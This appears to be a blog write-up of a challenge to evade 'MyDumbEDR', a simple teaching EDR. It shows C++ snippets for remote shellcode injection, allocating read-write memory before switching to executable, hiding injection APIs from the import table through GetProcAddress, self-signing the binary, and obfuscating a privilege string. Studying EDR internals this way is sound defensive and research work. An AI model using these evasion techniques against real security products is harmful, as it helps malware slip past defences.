---
layout: post
title: Bypass MyDumbEDR
subtitle: There's lots to learn!
tags: [CyberSec]
comments: true
---


I attempted to find a straightforward way to bypass this EDR, avoiding more complex techniques such as Syshwipers3 or DLL unhooking. In this exploration, I focused on simplicity to navigate through the challenges posed by the Endpoint Detection and Response (EDR) system. Indeed, my primary goal was to gain a comprehensive understanding of the EDR, exploring its functionality and potential for creating one.

## What about The Remote Injector Agent ?

This EDR rely primarily on *inline API hooking*.

So, when we are trying to execute any functions using high level WinAPI, functions from *ntdll.dll* are indirectly triggered. The EDR applies hooks over "some of them" to detect for malicious calls.

![Alt text](https://rfc6592.github.io/assets/img/EDR/Pastedimage20240131221528.png)
![Alt text](https://rfc6592.github.io/assets/img/EDR/Pastedimage20240131221550.png)

The first hook we will try to bypass is the hook on  `ntAllocateVirtualMemory`, as you can see, the EDR will check if the program want to allocate in Read-Write-Execute (RWX).
![Alt text](https://rfc6592.github.io/assets/img/EDR/Pastedimage20240131155650.png)

So to bypass this we just need to allocate the memory in *Read-Write* then when it's done we can change the protection to add the *Execute* and that's it. 

```c++
PVOID remoteBuffer = VirtualAllocEx_f(processHandle, NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

WriteProcessMemory_f(processHandle, remoteBuffer, shellcode, shellcode_len, NULL);

rv = VirtualProtect_f(shellcode, shellcode_len, PAGE_EXECUTE_READWRITE, &oldprotect);
```

## What about the Static Analyzer Agent ?

The static analyser will check for three things:

- [x] If the binary is signed
- [x] If the *OpenProcess*, *VirtualAllocEx*, *WriteProcessMemory* and *CreateRemoteThread* functions are listed in the **IAT** `(Import Address Table)`
- [x] If the string SeDebugPrivilege is present in the binary


#### 0x1 - Code signing

First of all, we are going to sign our binary. We need to know that the EDR will only check if the binary is signed or not, so we just need to sign our binary and it's will be fine.
![Alt text](https://rfc6592.github.io/assets/img/EDR/Pastedimage20240131230908.png)

So, we are going to generate a self-signed certificate :
```
makecert -r -pe -n "CN=MyRootCA,O=TechSolutions,L=SanFrancisco,S=California,C=US" -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv CA.pvk CA.cer
```

```
# 1.3.6.1.5.5.7.3.3 = Code Signing
# 1.3.6.1.4.1.311.10.3.24 = Protected process verification
# 1.3.6.1.4.1.311.10.3.6 = Windows System component verification


makecert -pe -n "CN=MyRootCA,O=TechSolutions,L=SanFrancisco,S=California,C=US" -a sha256 -cy end -sky signature -eku 1.3.6.1.5.5.7.3.3,1.3.6.1.4.1.311.10.3.24,1.3.6.1.4.1.311.10.3.6 -ic CA.cer -iv CA.pvk -sv SPC.pvk SPC.cer
```

We import the CA certificate :
```md
certutil -user -addstore Root CA.cer
```

Then we are going to convert our certificate in the pfx format :
```md
pvk2pfx -pvk SPC.pvk -spc SPC.cer -pfx SPC.pfx
```

And finally, we are going to sign our binary :
```md
signtool sign /v /fd SHA256 /f SPC.pfx ShellcodeInject.exe
```

![Alt text](https://rfc6592.github.io/assets/img/EDR/Pastedimage20240131231309-1.png)

#### 0x2 - Hiding from the Import Address Table (IAT)

The IAT is a lookup table used when the application is calling functions in a different module. When the file is executed, the Windows Loader will fill in the IAT with the appropriate function addresses.

So, to see which functions are in the IAT, we can use the `dumpbin.exe`

```md
dumpbin /imports C:\Windows\system32\notepad.exe
```

![Alt text](https://rfc6592.github.io/assets/img/EDR/Pastedimage20240131163110.png)


So to hide our functions in our binary we are going to obfuscate them.

```c++
typedef BOOL(WINAPI* pVirtualProtect)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flNewProtect,
    PDWORD lpflOldProtect
);

typedef HANDLE(WINAPI* pCreateRemoteThread)(
    HANDLE                 hProcess,
    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    SIZE_T                 dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID                 lpParameter,
    DWORD                  dwCreationFlags,
    LPDWORD                lpThreadId
);

typedef LPVOID(WINAPI* pVirtualAllocEx)(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
);

typedef NTSTATUS(WINAPI* pNtOpenProcess)(
    PHANDLE            ProcessHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID         ClientId
    );

typedef BOOL(WINAPI* pWriteProcessMemory)(
    HANDLE  hProcess,
    LPVOID  lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T  nSize,
    SIZE_T* lpNumberOfBytesWritten
);
```

```cpp
pVirtualAllocEx VirtualAllocEx_f = reinterpret_cast<pVirtualAllocEx>(
	GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAllocEx"));

pCreateRemoteThread CreateRemoteThread_f = reinterpret_cast<pCreateRemoteThread>(
	GetProcAddress(GetModuleHandle("kernel32.dll"), "CreateRemoteThread"));

pWriteProcessMemory WriteProcessMemory_f = reinterpret_cast<pWriteProcessMemory>(
	GetProcAddress(GetModuleHandle("kernel32.dll"), "WriteProcessMemory"));

pNtOpenProcess NtOpenProcess_f = reinterpret_cast<pNtOpenProcess>(
	GetProcAddress(GetModuleHandle("ntdll.dll"), "NtOpenProcess"));

pVirtualProtect VirtualProtect_f = reinterpret_cast<pVirtualProtect>(
	GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualProtect"));
```


#### 0x3 - Token privileges ?

To open a handle to another process and obtain full access rights, we **must** enable the `SeDebugPrivilege` privilege.

if we request `PROCESS_ALL_ACCESS` when calling `OpenProcess`, the operation may require `SeDebugPrivilege`...

*Wait wait wait ...*

Before checking what exaclty the function do, I was thinking that the EDR will check if the binary has the `SeDebugPrivilege` enabled 😅. So, this function is a simple form of pattern matching and does not directly check if the binary itself has the `SeDebugPrivilege` enabled during runtime. The function is more about inspecting the static content of a binary file for a specific string, but it doesn't verify whether the binary, when executed, will have `SeDebugPrivilege` enabled.

![Alt text](https://rfc6592.github.io/assets/img/EDR/Pastedimage20240131172033.png)

So we just need to obfuscate strings with *SeDebugPrivilege* and that's it.

![Alt text](https://rfc6592.github.io/assets/img/EDR/Pastedimage20240131231827.png)


Upon attempting to execute the *ShellCode.exe* it seems that the Calculator application is not launching as expected. Feel free to contact me with any questions or comments. See you soon!

If you're interested in the code, you can find it on GitHub: 
https://github.com/RFC6592/ChallengeDumbEDR

## Source 

* (Cocomelonc, 2024), https://cocomelonc.github.io/tutorial/2021/12/13/malware-injection-12.html
* (Medium, 2024), https://medium.com/@singhr780/how-to-do-code-signing-using-self-signed-certificate-c51fe6884532
* (Sektor7), Red Team Operator: Malware Development Essentials Course 